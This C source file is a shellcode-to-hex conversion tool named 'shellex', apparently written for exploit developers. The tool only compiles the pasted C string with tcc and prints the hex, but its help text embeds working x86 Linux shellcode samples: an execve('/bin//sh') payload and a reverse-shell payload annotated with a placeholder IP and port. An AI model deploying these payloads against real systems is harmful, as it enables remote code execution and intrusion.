#define SHELLEX_VER "0.1b"

/*
shellex - MIT License - Copyright 2020
David Reguera Garcia aka Dreg - dreg@fr33project.org
http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
IN THE SOFTWARE.
-
C-shellcode to hex
-
linux compile: gcc -o shellex shellex.c && ./shellex
-
WARNING! this is a POC, the code is CRAP
*/

#include <stdio.h>
#include <string.h>

#define C_CODE                                                                                                         \
    ";\n#include <stdio.h> \n int main(void){  puts(\"\\n\\nOK+drG "                                                   \
    "sh3llc0d3!\\n\\n\");  for (int i = 0; i < sizeof(shellcode) - 1; i++) { "                                         \
    "printf(\"%02X \", shellcode[i]); } puts(\"\\n\\n\\n-EnD5c\\n\"); return "                                         \
    "0;}\n"
#define UC_DEC_SC "unsigned char shellcode[] = "

int
dtask(void);

int
main(int argc, char* argv[])
{
    int retf = 3;
    int waitf = 0;

    puts("shellex " SHELLEX_VER " - MIT License - Copyright 2020\n"
        "C-shellcode to hex, in Linux you should install tcc (sudo apt-get "
        "install tcc)\n"
        "David Reguera Garcia aka Dreg - dreg@fr33project.org\n"
        "http://github.com/David-Reguera-Garcia-Dreg/ - "
        "http://www.fr33project.org/\n"
        "\n"
        "Syntax:\n"
        "    -w: waits press enter to close the console\n"
        "    -h: convert hex values of default mode to C hex string: shellex -w -h "
        "6A 17 58 31 DB CD 80 6A 0B 58 99 52 68 2F 2F 73 68 68 2F 62 69 6E 89 "
        "E3 52 53 89 E1 CD 80\n"
        "\n"
        "    no params: default mode (C-shellcode to hex)\n");

    if (argc > 1)
    {
        for (int i = 1; i < argc && retf == 3; i++)
        {
            if (argv[i][0] == '-')
            {
                switch (argv[i][1])
                {
                case 'h':
                    // putchar('"');
                    for (int j = i + 1; j < argc; j++)
                    {
                        printf("\\x%s", argv[j]);
                    }
                    // puts("\"\n");
                    puts("\n");
                    retf = 0;

                    break;

                case 'w':
                    waitf = 1;
                    break;

                }
            }
        }
    }


    if (retf == 3)
    {
        puts("Just paste the shellcode c-string and press ENTER\n"
            "To end use Control+Z(Windows)/Control+D(Linux), examples:"
            "multi-line-hex+mixed_ascii valid shellcode:\n"
            "\"\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\"\n"
            "\"\\x6a\\x0b\\x58\\x99\\x52\\x68//sh\\x68/"
            "bin\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80\" \n"
            "Example of a multi-line-with-comments valid shellcode:\n"
            "\"\\x68\"\n"
            "\"\\x7f\\x01\\x01\\x01\"  // <- IP:  127.1.1.1\n"
            "\"\\x5e\\x66\\x68\"\n"
            "\"\\xd9\\x03\"          // <- Port: 55555\n"
            "\"\\x5f\\x6a\\x66\\x58\\x99\\x6a\\x01\\x5b\\x52\\x53\\x6a\\x02\"\n"
            "\"\\x89\\xe1\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\"\n"
            "\"\\xf9\\xb0\\x66\\x56\\x66\\x57\\x66\\x6a\\x02\\x89\\xe1\\x6a\"\n"
            "\"\\x10\\x51\\x53\\x89\\xe1\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x2f\"\n"
            "\"\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\"\n"
            "\"\\xeb\\xce\"\n\n\n");

        retf = dtask();
    }

    if (waitf)
    {
        puts("\npress enter to exit");
        getchar();
    }

    return retf;
}

#ifdef _WIN64
#error only win32 supported
#endif

#ifdef WIN32
#include <windows.h>

#include <tchar.h>
#include <strsafe.h>


#define BUFSIZE 4096

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

HANDLE g_hInputFile = NULL;

void
CreateChildProcess(void);
void
WriteToPipe(void);
void
ReadFromPipe(void);
void ErrorExit(PTSTR);

int
dtask(void)
{
    SECURITY_ATTRIBUTES saAttr = { 0 };

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
        ErrorExit(TEXT("StdoutRd CreatePipe"));

    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
        ErrorExit(TEXT("Stdout SetHandleInformation"));

    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
        ErrorExit(TEXT("Stdin CreatePipe"));

    if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
        ErrorExit(TEXT("Stdin SetHandleInformation"));

    CreateChildProcess();

    g_hInputFile = GetStdHandle(STD_INPUT_HANDLE);

    if (g_hInputFile == INVALID_HANDLE_VALUE)
        ErrorExit(TEXT("CreateFile"));

    WriteToPipe();
    ReadFromPipe();

    return 0;
}

void
GetCurrentPath(WCHAR* current_path)
{
    wchar_t* tmp_ptr;

    ZeroMemory(current_path, sizeof(wchar_t) * MAX_PATH);

    GetModuleFileNameW(GetModuleHandleW(NULL), current_path, sizeof(wchar_t) * MAX_PATH);
    tmp_ptr = current_path;
    tmp_ptr += wcslen(current_path);
    while (tmp_ptr[0] != '\\')
    {
        tmp_ptr--;
        if (tmp_ptr <= current_path)
        {
            ZeroMemory(current_path, sizeof(wchar_t) * MAX_PATH);
            return;
        }
    }
    tmp_ptr[1] = 0;
}

void
CreateChildProcess(void)
{
    wchar_t program_name[MAX_PATH * 2] = { 0 };
    PROCESS_INFORMATION piProcInfo = { 0 };
    STARTUPINFOW siStartInfo = { 0 };
    BOOL bSuccess = FALSE;

    GetCurrentPath(program_name);

    wcscat_s(program_name, ARRAYSIZE(program_name), L"tcc\\tcc.exe");

    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    bSuccess = CreateProcessW(program_name,
        L"tcc.exe -run -", // command line
        NULL,              // process security attributes
        NULL,              // primary thread security attributes
        TRUE,              // handles are inherited
        0,                 // creation flags
        NULL,              // use parent's environment
        NULL,              // use parent's current directory
        &siStartInfo,      // STARTUPINFO pointer
        &piProcInfo);      // receives PROCESS_INFORMATION

    if (!bSuccess)
        ErrorExit(TEXT("CreateProcess"));
    else
    {
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

        CloseHandle(g_hChildStd_OUT_Wr);
        CloseHandle(g_hChildStd_IN_Rd);
    }
}

void
WriteToPipe(void)
{
    DWORD dwRead, dwWritten;
    CHAR chBuf[BUFSIZE];
    BOOL bSuccess = FALSE;

    WriteFile(g_hChildStd_IN_Wr, UC_DEC_SC, sizeof(UC_DEC_SC) - 1, &dwWritten, NULL);
    puts(UC_DEC_SC);
    for (;;)
    {
        memset(chBuf, 0, sizeof(chBuf));
        dwRead = 0;
        bSuccess = ReadFile(g_hInputFile, chBuf, BUFSIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0)
            break;

        /*
        if (dwRead > 0)
        {
        CHAR* ptrchr;
        ptrchr = chBuf;
        while (*ptrchr != '\0')
        {
        *ptrchr = ((*ptrchr == 0x0A) || (*ptrchr == 0x0D))  ? ' ' : *ptrchr;
        ptrchr++;
        }
        }
        */

        dwWritten = 0;
        bSuccess = WriteFile(g_hChildStd_IN_Wr, chBuf, dwRead, &dwWritten, NULL);
        // if (0 != dwWritten) { puts(chBuf); }
        if (!bSuccess)
            break;
    }

    WriteFile(g_hChildStd_IN_Wr, C_CODE, sizeof(C_CODE) - 1, &dwWritten, NULL);
    // puts(C_CODE);

    if (!CloseHandle(g_hChildStd_IN_Wr))
        ErrorExit(TEXT("StdInWr CloseHandle"));
}

void
ReadFromPipe(void)
{
    DWORD dwRead, dwWritten;
    CHAR chBuf[BUFSIZE];
    BOOL bSuccess = FALSE;
    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    for (;;)
    {
        memset(chBuf, 0, sizeof(chBuf));

        dwRead = 0;
        bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0)
            break;

        dwWritten = 0;
        bSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
        if (!bSuccess)
            break;
    }
}

void
ErrorExit(PTSTR lpszFunction)
{
    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError();

    FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0,
        NULL);

    lpDisplayBuf = (LPVOID)LocalAlloc(
        LMEM_ZEROINIT, (lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
    StringCchPrintf((LPTSTR)lpDisplayBuf,
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("%s failed with error %d: %s"),
        lpszFunction,
        dw,
        lpMsgBuf);
    MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
    ExitProcess(1);
}

#else

#include <stdlib.h>
#include <unistd.h>

#define BUZZSZZ 0x1000
int
dtask(void)
{
    char buf[BUZZSZZ] = { 0 };
    char filename[] = "/tmp/shellex.XXXXXX";
    int fd = 0;
    FILE* pp = NULL;

    fd = mkstemp(filename);

    if (fd == -1)
    {
        return 1;
    }

    write(fd, UC_DEC_SC, sizeof(UC_DEC_SC) - 1);

    while (read(0, buf, sizeof(buf) - 1) != 0)
    {
        write(fd, buf, strlen(buf));
        memset(buf, 0, sizeof(buf));
    }

    write(fd, C_CODE, sizeof(C_CODE) - 1);

    close(fd);

    memset(buf, 0, sizeof(buf));
    sprintf(buf, "cat %s | tcc -run -", filename);

    pp = popen(buf, "r");
    if (NULL != pp)
    {
        memset(buf, 0, sizeof(buf));
        fread(buf, 1, sizeof(buf) - 1, pp);
        puts(buf);
        pclose(pp);
    }
    else
    {
        perror("tcc executable");
    }

    // puts(filename);
    unlink(filename);
}

#endif